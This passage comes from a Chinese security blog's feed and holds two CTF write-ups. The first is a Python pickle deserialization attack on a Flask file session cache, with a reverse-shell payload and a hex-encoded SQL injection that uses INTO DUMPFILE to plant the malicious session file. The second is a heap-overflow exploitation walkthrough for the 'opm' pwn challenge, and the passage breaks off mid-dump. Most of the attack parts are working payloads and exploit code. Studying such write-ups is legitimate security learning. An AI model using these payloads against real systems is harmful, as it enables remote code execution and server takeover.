class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"id"</span>,))    </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œæ•ˆæœï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ Ubuntu in ~/py_web [11:24:46]</span><br><span class="line"><span class="meta">$</span> python p_test.py</span><br><span class="line">uid=1000(kira) gid=1000(kira) groups=1000(kira),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç°åœ¨é‡æ–°çœ‹çœ‹<code>load(file)</code>å’Œ<code>loads(str)</code>ä¸¤ä¸ªå‡½æ•°ï¼Œæ˜¯å¸¦æœ‰è¿‡æ»¤çš„ååºåˆ—åŒ–ï¼Œä¸€ä¸ªç”¨äºæ“ä½œæ–‡ä»¶ï¼Œä¸€ä¸ªç”¨äºæ“ä½œå­—ç¬¦ä¸²ã€‚</p><p>æœç´¢ä¸€ä¸‹ï¼Œçœ‹çœ‹ä»£ç é‡Œé¢å“ªé‡Œç”¨åˆ°è¿™ä¸ªä¸¤ä¸ªå‡½æ•°ï¼Œå‘ç°åœ¨<code>Mycache.py</code>æœ‰è¿™ä¸ªç±»ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemCache(BaseCache)</span><br></pre></td></tr></table></figure></p><p>è€Œç”¨åˆ°è¿™ä¸ªç±»çš„ä»£ç éƒ½åœ¨<code>Mysession.py</code>è¿™ä¸ªç±»ï¼Œéƒ½æ˜¯å¯¹sessionæ“ä½œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemSessionInterface(SessionInterface)</span><br></pre></td></tr></table></figure></p><p>é‡ç‚¹ç•™æ„ä¸‹<code>open_session()</code>å’Œ<code>save_session()</code>ï¼Œè¿™æ˜¯ååºåˆ—åŒ–å¸¸è§å¥—è·¯ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    <span class="keyword">if</span> self.use_signer:</span><br><span class="line">        signer = self._get_signer(app)</span><br><span class="line">        <span class="keyword">if</span> signer <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sid_as_bytes = signer.unsign(sid)</span><br><span class="line">            sid = sid_as_bytes.decode()</span><br><span class="line">        <span class="keyword">except</span> BadSignature:</span><br><span class="line">            sid = self._generate_sid()</span><br><span class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    data = self.cache.get(self.key_prefix + sid)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> self.session_class(data, sid=sid)</span><br><span class="line">    <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br></pre></td></tr></table></figure></p><p>ç•™æ„<code>open_session()</code>ä¸­è°ƒç”¨äº†<code>self.cache.get(self.key_prefix + sid)</code>ï¼Œè·Ÿè¿›ä¹‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span> <span class="comment"># key = self.key_prefix + sid</span></span><br><span class="line">    filename = self._get_filename(key)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle_time = load(f) <span class="comment">#å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</span><br><span class="line">                a = load(f) <span class="comment">#å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.remove(filename)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">except</span> (IOError, OSError, PickleError):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure></p><p><code>get</code>ä¸­ä¸¤å¤„åœ°æ–¹å‡ºç°<code>load()</code>ï¼Œååˆ†å¯ç–‘ã€‚<code>filename = self._get_filename(key)</code>è·Ÿè¿›ä¹‹ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_filename</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(key, text_type):</span><br><span class="line">        key = key.encode(<span class="string">'utf-8'</span>)  <span class="comment"># XXX unicode review</span></span><br><span class="line">    hash = md5(key).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> os.path.join(self._path, hash)</span><br></pre></td></tr></table></figure></p><p>å¯è§<code>filename</code>å°±æ˜¯<code>md5(self.key_prefix + sid)</code>ï¼ŒæŸ¥çœ‹ä»£ç å¯å‘ç°ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_prefix=<span class="string">"bdwsessions"</span></span><br><span class="line">sid = request.cookies.get(app.session_cookie_name)</span><br></pre></td></tr></table></figure></p><p>æŸ¥çœ‹é¡µé¢çš„cookieï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid = ca823fed-c8b9-450c-8ec9-fc7626ce8326</span><br><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ce8326&quot;) = 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><p>sessionå­˜åœ¨ç›®å½•åœ¨<code>config.py</code>ä¸­å°±è®°å½•ï¼Œæœ¬åœ°éªŒè¯ä¸€ä¸‹ï¼Œæœç„¶å­˜åœ¨ã€‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ Ubuntu in ~ [14:24:00] C:1</span><br><span class="line"><span class="meta">$</span> ll /tmp/ffff |grep 7d6e204846c11a84ab0bc317eab14411</span><br><span class="line">-rw-rw---- 1 kira kira 254 Apr 15 14:19 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li>æœ¬åœ°ç”Ÿæˆåºåˆ—åŒ–sessionæ–‡ä»¶</li><li>è·Ÿè¿›sessionæ–‡ä»¶åè§„åˆ™è®¡ç®—å‡ºæ–‡ä»¶å</li><li>åˆ©ç”¨mysqlçš„æ³¨å…¥ï¼Œå°†æ–‡ä»¶å†™å…¥/tmp/ffffç›®å½•</li><li>è®¿é—®indexçš„æ—¶ï¼Œä¿®æ”¹è‡ªå·±çš„sessionä¸ºä¹‹å‰æˆ‘ä»¬å®šä¹‰çš„å€¼</li><li>è§¦å‘<code>open_session</code>ä¸­çš„<code>self.cache.get</code>ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»</li></ol><p>æºç è¿˜è®¾ç½®äº†æ²™ç®±/é»‘åå•æ¥é˜²æ­¢æŸäº›å‡½æ•°çš„æ‰§è¡Œï¼Œé¦–å…ˆéœ€è¦ç»•è¿‡é»‘åå•ï¼Œè§‚å¯Ÿä¸€ä¸‹ï¼Œè¿˜æœ‰ä»¥ä¸‹ä¸åœ¨é»‘åå•ä¸­ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen</span><br><span class="line">subprocess.call</span><br><span class="line">commands</span><br></pre></td></tr></table></figure></p><p>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œæµ‹è¯•åå¼¹shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9394));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>ä¸ºäº†åç»­æ³¨å…¥ï¼Œå°†sessionå†…å®¹è¿›è¡Œhexç¼–ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="keyword">print</span> f2.read().encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>æ–°çš„sessionæ–‡ä»¶éšä¾¿ä¿®æ”¹ä¸€ä¸‹ä¹‹å‰çš„sid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ceffff&quot;) = d9e836cec5ab2c715fd4050fdc26bd4b</span><br></pre></td></tr></table></figure></p><p>æ³¨å…¥ç‚¹å°±ç”¨ä¸Šé¢æåˆ°Emailçš„æ³¨å…¥ç‚¹ï¼Œæ„é€ payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;123&apos;/**/union/**/select/**/0x63636f6d6d616e64730a6765746f75747075740a70300a285327707974686f6e202d63205c27696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223132372e302e302e31222c3933393429293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b5c27270a70310a7470320a5270330a2e/**/into/**/dumpfile/**/&apos;/tmp/ffff/d9e836cec5ab2c715fd4050fdc26bd4b&apos;#@qq.com&apos;</span><br></pre></td></tr></table></figure></p><p>é‚®ç®±åœ°å€å¡«å…¥ä»¥ä¸Špayloadï¼Œç‚¹å‡»submitåå‡ºç°<code>Please use a different email address.</code>å³å¯ã€‚</p><p>æ¥ç€åœ¨burpä¸­æŠ“å–è®¿é—®indexçš„åŒ…ï¼Œå¹¶ä¿®æ”¹sessionä¸º<code>ca823fed-c8b9-450c-8ec9-fc7626ceffff</code>ï¼Œåœ¨è‡ªå·±çš„vpsä¸Šç›‘å¬å¯¹åº”çš„ç«¯å£ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ¬æ–‡çº¯å±æŠ„è¢­ï¼Œå¦‚æœ‰æ”¹åŠ¨ï¼Œçº¯å±æ‰‹æ®‹ã€‚&lt;/p&gt;
&lt;p&gt;åŸwriteupè§ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93
      
    
    </summary>
    
    
      <category term="web" scheme="https://4f-kira.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-opm</title>
    <link href="https://4f-kira.github.io/2018/04/12/qwb-pwn-opm/"/>
    <id>https://4f-kira.github.io/2018/04/12/qwb-pwn-opm/</id>
    <published>2018-04-12T08:33:24.000Z</published>
    <updated>2018-04-12T08:35:00.146Z</updated>
    
    <content type="html"><![CDATA[<h3 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h3><p>é¦–å…ˆå­¦ä¹ ä¸€ä¸‹åœ¨IDAåˆ›å»ºç»“æ„ä½“ï¼Œ<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">https://blog.csdn.net/hgy413/article/details/7104304</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 length          dq ?</span><br><span class="line">00000018 punch_num       dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure><p>æŒ‰yé‡æ–°è®¾ç½®ç±»å‹åï¼Œadd_role()ä¼ªä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">role *<span class="title">add_role</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  role *v0; <span class="comment">// rbx</span></span><br><span class="line">  role *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  role *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1A0h]</span></span><br><span class="line">  role *v6; <span class="comment">// [rsp+80h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+100h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+188h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (role *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  sub_56544D04DE2C((__int64)v0);                <span class="comment">// åˆå§‹åŒ–ç»“æ„ä½“</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v0-&gt;func = (__int64)show;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// æº¢å‡ºç‚¹</span></span><br><span class="line">  v1 = v6;</span><br><span class="line">  v1-&gt;length = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, &amp;s);</span><br><span class="line">  v6-&gt;name = (__int64)v7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"N punch?"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// æº¢å‡ºç‚¹</span></span><br><span class="line">  v3 = v6;</span><br><span class="line">  LODWORD(v3-&gt;punch_num) = atoi(&amp;s);</span><br><span class="line">  show((__int64)v6);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯ï¼šgetså¯ä»¥è¦†ç›–v6ï¼ˆæ³¨æ„getsä¼šåœ¨æœ«ä½åŠ ä¸Šâ€™\x00â€™ï¼‰ï¼Œç¬¬ä¸€ä¸ªæº¢å‡ºç‚¹å¯ä»¥æ”¹å˜ç»“æ„ä½“å­˜æ”¾çš„åœ°å€ï¼Œç¬¬äºŒæº¢å‡ºç‚¹å¯ä»¥ç”¨äºæ³„éœ²åœ°å€ã€‚</p><p><strong>å…·ä½“åˆ©ç”¨è¿‡ç¨‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)  <span class="comment">#padding</span></span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">"\x10"</span>,<span class="number">2</span>) <span class="comment">#role1</span></span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>) <span class="comment">#role2</span></span><br></pre></td></tr></table></figure><p>ç¨‹åºåœ¨heapä¸Šä¼šæœ‰ä¸ªå¾ˆå¤§çš„chunkï¼Œæ‰€ä»¥è¦†ç›–v6çš„æœ€ä½ä½ï¼Œæˆ–è€…å€’æ•°ç¬¬äºŒä¸º\x00ï¼ŒæŒ‡é’ˆä»ç„¶åœ¨heapä¸Šã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5603fb8e5000</span><br><span class="line">0x5603fb8e5000:0x00000000000000000x0000000000011c11</span><br><span class="line">0x5603fb8e5010:0x0000000000011c000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆæ­£å¸¸åˆ›å»ºä¸€ä¸ªrole0ï¼ˆç”¨æ¥è°ƒæ•´å †çš„ä½ç½®ï¼Œè®©role1-&gt;nameåœ¨å¯æ§èŒƒå›´èŒƒå›´å†…ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x55877d5ee000+0x11c10</span><br><span class="line">0x55877d5ffc10:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffc20:0x000055877c368b30-&gt;func0x000055877d5ffc50-&gt;name</span><br><span class="line">0x55877d5ffc30:0x0000000000000070-&gt;len 0x0000000000000001-&gt;punch</span><br><span class="line">0x55877d5ffc40:0x00000000000000000x0000000000000081</span><br><span class="line">0x55877d5ffc50:0x41414141414141410x4141414141414141-&gt;å­˜æ”¾nameçš„chunk</span><br><span class="line">0x55877d5ffc60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure></p><p>ç„¶ååˆ›å»ºä¸€ä¸ªrole1ï¼Œè¾“å…¥nameçš„æ—¶å€™v6è¢«è¦†ç›–æˆ<code>xxxx0010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x55877c56a0e0</span><br><span class="line">0x55877c56a0e0:0x000055877d5ffc20-&gt;role00x000055877d5f0010-&gt;role1</span><br><span class="line">0x55877c56a0f0:0x000055877d5f0010-&gt;role20x0000000000000000</span><br></pre></td></tr></table></figure><p>ç”±äºv6è¢«è¦†ç›–ï¼Œåªæœ‰funcå­˜åˆ°æ­£ç¡®ä½ç½®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffcc0:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffcd0:0x000055877c368b30-&gt;func0x0000000000000000</span><br><span class="line">0x55877d5ffce0:0x0000000000000000        0x0000000000000000</span><br><span class="line">0x55877d5ffcf0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffd00:0x42424242424242420x4242424242424242-&gt;å­˜æ”¾nameçš„chunk</span><br><span class="line">0x55877d5ffd10:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure></p><p>å…¶ä½™éƒ¨åˆ†å­˜æ”¾åˆ°<code>0x000055877d5f0010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x000055877d5f0010</span><br><span class="line">0x55877d5f0010:0x00000000000000000x000055877d5ffd00-&gt;name</span><br><span class="line">0x55877d5f0020:0x00000000000000810x0000000000000003</span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºä¸€ä¸ªrole2ï¼Œç¬¬ä¸€æ¬¡æº¢å‡ºè¦†ç›–v6æœ€ä½ä½ä¸º<code>xxxxxx00</code>ï¼Œæœ¬æ¥åº”ä¸º<code>0x55877d5ffd90</code>ï¼Œå˜æˆäº†<code>0x55877d5ffd00</code>ï¼Œè€Œè¿™ä¸ªåœ°å€æ˜¯role1å­˜æ”¾nameçš„chunkã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br></pre></td></tr></table></figure></p><p>é‡æ–°æŸ¥çœ‹role1çš„heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd00:0x42424242424242420x000055877d5ffdc0-&gt;role1çš„nameåœ°å€</span><br><span class="line">0x55877d5ffd10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>ç¬¬äºŒæ¬¡æº¢å‡ºè¦†ç›–v6æœ€ä½ä½ä¸º<code>xxxx0010</code>ï¼Œé‚£ä¹ˆv6å˜æˆ<code>0x000055877d5f0010</code>ï¼Œè¿™ä¸ªåœ°å€æ˜¯role1çš„åœ°å€ï¼Œå‡½æ•°ç»“æŸæ—¶å€™showå°±ä¼šæŠŠrole1-&gt;nameæ‰“å°å‡ºæ¥ï¼Œæ­¤æ—¶role-&gt;nameæœ‰heapçš„åœ°å€ã€‚</p><p>æœ‰äº†heapåœ°å€ï¼Œå°±å¯ä»¥ä¼ªé€ roleæ³„éœ²å‡½æ•°åœ°å€ï¼Œ<code>0x000055877d5ffdc0-0x30</code>å°±æ˜¯role2-&gt;funcçš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(&apos;E&apos;*8+p64(heap-0x30),str(131441).ljust(0x80,&apos;F&apos;)+p64(heap+0xc0))</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªrole3ï¼Œåˆ©ç”¨role3-&gt;nameè¿›è¡Œä¼ªé€ roleï¼Œrole3-&gt;name[0]å½“ä½œfuncï¼Œrole3-&gt;name[1]å¡«å…¥role2-&gt;funcçš„åœ°å€<code>0x000055877d5ffdc0-0x30</code>ï¼Œåœ¨ç¬¬äºŒä¸ªæº¢å‡ºç‚¹ä¿®æ”¹v6ä¸ºfake roleçš„åœ°å€<code>0x000055877d5ffdc0+0xc0</code>ï¼Œç”±äºpunch numçš„è¾“å…¥ä¼šç ´åtop chunkï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—æ­¤æ—¶æ­£ç¡®çš„æ•°å€¼ï¼Œå¹¶è¾“å…¥ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åŸæ¥top chunk:0x201c1</span><br><span class="line">æ–°å»ºrole3åç”³è¯·äº†0x30+0x20çš„ç©ºé—´</span><br><span class="line">æ­¤æ—¶top chunk:0x201c1-0x50 = 0x20171 = 131441</span><br></pre></td></tr></table></figure></p><p>å®Œæˆrole3åˆ›å»ºåheapç»“æ„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64gx 0x55877d5ffd80</span><br><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031 ----&gt;role2</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span 